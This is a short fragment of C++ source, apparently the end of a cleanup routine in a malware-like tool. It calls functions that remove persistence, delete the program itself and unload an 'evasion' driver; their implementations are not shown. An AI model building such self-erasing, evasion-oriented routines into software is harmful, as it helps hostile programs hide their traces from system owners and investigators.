    vex::persist::Remove();
    vex::utils::SelfDelete();
    vex::evasion::UnloadDriver();

    return 0;
}